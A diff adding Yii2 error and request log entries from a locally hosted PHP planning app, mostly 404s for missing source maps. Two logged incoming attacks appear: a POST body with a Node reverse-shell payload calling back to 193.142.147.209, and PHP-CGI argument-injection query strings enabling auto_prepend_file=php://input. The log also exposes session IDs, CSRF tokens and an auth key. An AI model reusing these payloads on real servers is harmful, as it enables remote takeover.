@@ -63163,3 +63163,470 @@ $_SERVER = [
     'REQUEST_TIME_FLOAT' => 1770505464.5951
     'REQUEST_TIME' => 1770505464
 ]
+2026-02-07 19:13:15 [127.0.0.1][1][tqtk6rqp21pso265rfr76l5fpm][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "css/bootstrap.min.css.map". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
+Stack trace:
+#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('css/bootstrap.m...', Array)
+#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
+#3 {main}
+
+Next yii\web\NotFoundHttpException: PÃ¡gina no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
+Stack trace:
+#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
+#2 {main}
+2026-02-07 19:13:13 [127.0.0.1][1][tqtk6rqp21pso265rfr76l5fpm][info][application] $_GET = []
+
+$_POST = []
+
+$_FILES = []
+
+$_COOKIE = [
+    '_identity' => 'e455bf0f3f19d398461e0e5cc33a6b0d367a92bacd3d8200c5d9875711ef127ca:2:{i:0;s:9:\"_identity\";i:1;s:48:\"[124,\"lprr1lLRw-PVHSWeU3Ojgn38Pfk94Hnj\",2592000]\";}'
+    'PHPSESSID' => 'tqtk6rqp21pso265rfr76l5fpm'
+    '_csrf' => '20a4c6f0b0b68f42462ff38f0dfa68c4ced1bf5a3d96b336032b3863ec9e0540a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"Qby64nvFRWU5f1WiprtX6kj56J-4KbrA\";}'
+]
+
+$_SESSION = [
+    '__flash' => []
+    '__id' => 1
+    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
+    'id_escuela' => 2
+    'nombre_escuela' => 'Club Aves Voladoras'
+    'escuela_activa' => true
+    'escuela_ultima_actualizacion' => 1770500718
+    'idEscuela' => 2
+    'nombreEscuela' => 'Club Aves Voladoras'
+]
+
+$_SERVER = [
+    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
+    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
+    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
+    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
+    'REDIRECT_PHPRC' => '\\xampp\\php'
+    'REDIRECT_TMP' => '\\xampp\\tmp'
+    'REDIRECT_STATUS' => '200'
+    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
+    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
+    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
+    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
+    'PHPRC' => '\\xampp\\php'
+    'TMP' => '\\xampp\\tmp'
+    'HTTP_HOST' => 'planealo.local'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
+    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
+    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
+    'HTTP_COOKIE' => '_identity=e455bf0f3f19d398461e0e5cc33a6b0d367a92bacd3d8200c5d9875711ef127ca%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A48%3A%22%5B124%2C%22lprr1lLRw-PVHSWeU3Ojgn38Pfk94Hnj%22%2C2592000%5D%22%3B%7D; PHPSESSID=tqtk6rqp21pso265rfr76l5fpm; _csrf=20a4c6f0b0b68f42462ff38f0dfa68c4ced1bf5a3d96b336032b3863ec9e0540a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22Qby64nvFRWU5f1WiprtX6kj56J-4KbrA%22%3B%7D'
+    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
+    'SystemRoot' => 'C:\\Windows'
+    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
+    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
+    'WINDIR' => 'C:\\Windows'
+    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
+'
+    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
+    'SERVER_NAME' => 'planealo.local'
+    'SERVER_ADDR' => '127.0.0.1'
+    'SERVER_PORT' => '80'
+    'REMOTE_ADDR' => '127.0.0.1'
+    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'REQUEST_SCHEME' => 'http'
+    'CONTEXT_PREFIX' => ''
+    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'SERVER_ADMIN' => 'postmaster@localhost'
+    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
+    'REMOTE_PORT' => '61579'
+    'REDIRECT_URL' => '/css/bootstrap.min.css.map'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_METHOD' => 'GET'
+    'QUERY_STRING' => ''
+    'REQUEST_URI' => '/css/bootstrap.min.css.map'
+    'SCRIPT_NAME' => '/index.php'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1770505993.8893
+    'REQUEST_TIME' => 1770505993
+]
+2026-02-07 19:13:18 [127.0.0.1][1][tqtk6rqp21pso265rfr76l5fpm][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "js/jsBootstrap5/bootstrap.bundle.min.js.map". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
+Stack trace:
+#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('js/jsBootstrap5...', Array)
+#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
+#3 {main}
+
+Next yii\web\NotFoundHttpException: PÃ¡gina no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
+Stack trace:
+#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
+#2 {main}
+2026-02-07 19:13:15 [127.0.0.1][1][tqtk6rqp21pso265rfr76l5fpm][info][application] $_GET = []
+
+$_POST = []
+
+$_FILES = []
+
+$_COOKIE = [
+    '_identity' => 'e455bf0f3f19d398461e0e5cc33a6b0d367a92bacd3d8200c5d9875711ef127ca:2:{i:0;s:9:\"_identity\";i:1;s:48:\"[124,\"lprr1lLRw-PVHSWeU3Ojgn38Pfk94Hnj\",2592000]\";}'
+    'PHPSESSID' => 'tqtk6rqp21pso265rfr76l5fpm'
+    '_csrf' => '20a4c6f0b0b68f42462ff38f0dfa68c4ced1bf5a3d96b336032b3863ec9e0540a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"Qby64nvFRWU5f1WiprtX6kj56J-4KbrA\";}'
+]
+
+$_SESSION = [
+    '__flash' => []
+    '__id' => 1
+    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
+    'id_escuela' => 2
+    'nombre_escuela' => 'Club Aves Voladoras'
+    'escuela_activa' => true
+    'escuela_ultima_actualizacion' => 1770500718
+    'idEscuela' => 2
+    'nombreEscuela' => 'Club Aves Voladoras'
+]
+
+$_SERVER = [
+    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
+    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
+    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
+    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
+    'REDIRECT_PHPRC' => '\\xampp\\php'
+    'REDIRECT_TMP' => '\\xampp\\tmp'
+    'REDIRECT_STATUS' => '200'
+    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
+    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
+    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
+    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
+    'PHPRC' => '\\xampp\\php'
+    'TMP' => '\\xampp\\tmp'
+    'HTTP_HOST' => 'planealo.local'
+    'HTTP_CONNECTION' => 'keep-alive'
+    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
+    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
+    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
+    'HTTP_COOKIE' => '_identity=e455bf0f3f19d398461e0e5cc33a6b0d367a92bacd3d8200c5d9875711ef127ca%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A48%3A%22%5B124%2C%22lprr1lLRw-PVHSWeU3Ojgn38Pfk94Hnj%22%2C2592000%5D%22%3B%7D; PHPSESSID=tqtk6rqp21pso265rfr76l5fpm; _csrf=20a4c6f0b0b68f42462ff38f0dfa68c4ced1bf5a3d96b336032b3863ec9e0540a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22Qby64nvFRWU5f1WiprtX6kj56J-4KbrA%22%3B%7D'
+    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
+    'SystemRoot' => 'C:\\Windows'
+    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
+    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
+    'WINDIR' => 'C:\\Windows'
+    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
+'
+    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
+    'SERVER_NAME' => 'planealo.local'
+    'SERVER_ADDR' => '127.0.0.1'
+    'SERVER_PORT' => '80'
+    'REMOTE_ADDR' => '127.0.0.1'
+    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'REQUEST_SCHEME' => 'http'
+    'CONTEXT_PREFIX' => ''
+    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'SERVER_ADMIN' => 'postmaster@localhost'
+    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
+    'REMOTE_PORT' => '61587'
+    'REDIRECT_URL' => '/js/jsBootstrap5/bootstrap.bundle.min.js.map'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_METHOD' => 'GET'
+    'QUERY_STRING' => ''
+    'REQUEST_URI' => '/js/jsBootstrap5/bootstrap.bundle.min.js.map'
+    'SCRIPT_NAME' => '/index.php'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1770505995.865
+    'REQUEST_TIME' => 1770505995
+]
+2026-02-07 19:31:49 [193.142.147.209][-][k20l3cnrgd61ce9rggddoig40b][error][yii\web\HttpException:400] yii\web\BadRequestHttpException: Incapaz de verificar los datos enviados. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Controller.php:346
+Stack trace:
+#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(195): yii\web\Controller->beforeAction(Object(yii\base\InlineAction))
+#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('index', Array)
+#2 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('site/index', Array)
+#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
+#4 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
+#5 {main}
+2026-02-07 19:31:49 [193.142.147.209][-][k20l3cnrgd61ce9rggddoig40b][info][application] $_GET = []
+
+$_POST = [
+    0 => '{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"var n=process.mainModule.require(\'net\'),c=process.mainModule.require(\'child_process\'),s=c.spawn(\'/bin/sh\',[]),cl=new n.Socket();cl.connect(12323,\'193.142.147.209\',()=>{cl.pipe(s.stdin);s.stdout.pipe(cl);s.stderr.pipe(cl);});\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}'
+    1 => '\"$@0\"'
+]
+
+$_FILES = []
+
+$_COOKIE = []
+
+$_SESSION = [
+    '__flash' => []
+]
+
+$_SERVER = [
+    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
+    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
+    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
+    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
+    'PHPRC' => '\\xampp\\php'
+    'TMP' => '\\xampp\\tmp'
+    'HTTP_HOST' => '201.209.50.227:80'
+    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    'CONTENT_LENGTH' => '623'
+    'CONTENT_TYPE' => 'multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad'
+    'HTTP_NEXT_ACTION' => 'x'
+    'HTTP_ACCEPT_ENCODING' => 'gzip'
+    'HTTP_CONNECTION' => 'close'
+    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
+    'SystemRoot' => 'C:\\Windows'
+    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
+    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
+    'WINDIR' => 'C:\\Windows'
+    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 201.209.50.227 Port 80</address>
+'
+    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
+    'SERVER_NAME' => '201.209.50.227'
+    'SERVER_ADDR' => '192.168.1.120'
+    'SERVER_PORT' => '80'
+    'REMOTE_ADDR' => '193.142.147.209'
+    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'REQUEST_SCHEME' => 'http'
+    'CONTEXT_PREFIX' => ''
+    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'SERVER_ADMIN' => 'postmaster@localhost'
+    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
+    'REMOTE_PORT' => '25848'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_METHOD' => 'POST'
+    'QUERY_STRING' => ''
+    'REQUEST_URI' => '/'
+    'SCRIPT_NAME' => '/index.php'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1770507109.4707
+    'REQUEST_TIME' => 1770507109
+]
+2026-02-07 19:36:25 [123.143.114.188][-][d69ghhmgmkv0hm9bcak73ttero][error][yii\web\HttpException:400] yii\web\BadRequestHttpException: Incapaz de verificar los datos enviados. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Controller.php:346
+Stack trace:
+#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(195): yii\web\Controller->beforeAction(Object(yii\base\InlineAction))
+#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('index', Array)
+#2 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('site/index', Array)
+#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
+#4 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
+#5 {main}
+2026-02-07 19:36:25 [123.143.114.188][-][d69ghhmgmkv0hm9bcak73ttero][info][application] $_GET = [
+    '­d_cgi_force_redirect=0_­d_cgi_redirect_status_env_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => ''
+]
+
+$_POST = []
+
+$_FILES = []
+
+$_COOKIE = []
+
+$_SESSION = [
+    '__flash' => []
+]
+
+$_SERVER = [
+    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
+    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
+    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
+    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
+    'PHPRC' => '\\xampp\\php'
+    'TMP' => '\\xampp\\tmp'
+    'HTTP_HOST' => '201.209.50.227'
+    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15'
+    'HTTP_CONNECTION' => 'close'
+    'CONTENT_LENGTH' => '37'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_ACCEPT_LANGUAGE' => 'en'
+    'HTTP_ACCEPT_ENCODING' => 'gzip'
+    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
+    'SystemRoot' => 'C:\\Windows'
+    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
+    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
+    'WINDIR' => 'C:\\Windows'
+    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 201.209.50.227 Port 80</address>
+'
+    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
+    'SERVER_NAME' => '201.209.50.227'
+    'SERVER_ADDR' => '192.168.1.120'
+    'SERVER_PORT' => '80'
+    'REMOTE_ADDR' => '123.143.114.188'
+    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'REQUEST_SCHEME' => 'http'
+    'CONTEXT_PREFIX' => ''
+    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'SERVER_ADMIN' => 'postmaster@localhost'
+    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
+    'REMOTE_PORT' => '41806'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_METHOD' => 'POST'
+    'QUERY_STRING' => '%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
+    'REQUEST_URI' => '/index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
+    'SCRIPT_NAME' => '/index.php'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1770507385.2417
+    'REQUEST_TIME' => 1770507385
+]
+2026-02-07 19:36:28 [123.143.114.188][-][d69ghhmgmkv0hm9bcak73ttero][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "test.php". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
+Stack trace:
+#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('test.php', Array)
+#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
+#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
+#3 {main}
+
+Next yii\web\NotFoundHttpException: PÃ¡gina no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
+Stack trace:
+#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
+#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
+#2 {main}
+2026-02-07 19:36:27 [123.143.114.188][-][d69ghhmgmkv0hm9bcak73ttero][info][application] $_GET = [
+    '­d_cgi_force_redirect=0_­d_cgi_redirect_status_env_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => ''
+]
+
+$_POST = []
+
+$_FILES = []
+
+$_COOKIE = [
+    'PHPSESSID' => 'd69ghhmgmkv0hm9bcak73ttero'
+    '_csrf' => '41969ab186a17e38d1c32da42a880a8394e2b846de1f9cb55403ae652db9d4a4a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"YK9T8ybGvzs76yB52sM8C_ojA0w3rzib\";}'
+]
+
+$_SESSION = [
+    '__flash' => []
+]
+
+$_SERVER = [
+    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
+    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
+    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
+    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
+    'REDIRECT_PHPRC' => '\\xampp\\php'
+    'REDIRECT_TMP' => '\\xampp\\tmp'
+    'REDIRECT_STATUS' => '200'
+    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
+    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
+    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
+    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
+    'PHPRC' => '\\xampp\\php'
+    'TMP' => '\\xampp\\tmp'
+    'HTTP_HOST' => '201.209.50.227'
+    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0'
+    'HTTP_CONNECTION' => 'close'
+    'CONTENT_LENGTH' => '37'
+    'HTTP_ACCEPT' => '*/*'
+    'HTTP_ACCEPT_LANGUAGE' => 'en'
+    'HTTP_COOKIE' => 'PHPSESSID=d69ghhmgmkv0hm9bcak73ttero; _csrf=41969ab186a17e38d1c32da42a880a8394e2b846de1f9cb55403ae652db9d4a4a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22YK9T8ybGvzs76yB52sM8C_ojA0w3rzib%22%3B%7D'
+    'HTTP_ACCEPT_ENCODING' => 'gzip'
+    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
+    'SystemRoot' => 'C:\\Windows'
+    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
+    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
+    'WINDIR' => 'C:\\Windows'
+    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 201.209.50.227 Port 80</address>
+'
+    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
+    'SERVER_NAME' => '201.209.50.227'
+    'SERVER_ADDR' => '192.168.1.120'
+    'SERVER_PORT' => '80'
+    'REMOTE_ADDR' => '123.143.114.188'
+    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'REQUEST_SCHEME' => 'http'
+    'CONTEXT_PREFIX' => ''
+    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
+    'SERVER_ADMIN' => 'postmaster@localhost'
+    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
+    'REMOTE_PORT' => '37772'
+    'REDIRECT_URL' => '/test.php'
+    'REDIRECT_QUERY_STRING' => '%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
+    'GATEWAY_INTERFACE' => 'CGI/1.1'
+    'SERVER_PROTOCOL' => 'HTTP/1.1'
+    'REQUEST_METHOD' => 'POST'
+    'QUERY_STRING' => '%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
+    'REQUEST_URI' => '/test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
+    'SCRIPT_NAME' => '/index.php'
+    'PHP_SELF' => '/index.php'
+    'REQUEST_TIME_FLOAT' => 1770507387.7825
+    'REQUEST_TIME' => 1770507387
+]
+2026-02-07 19:36:30 [123.143.114.188][-][d69ghhmgmkv0hm9bcak73ttero][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "test.hello". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
+Stack trace:
+#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('test.hello', Array)
+#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
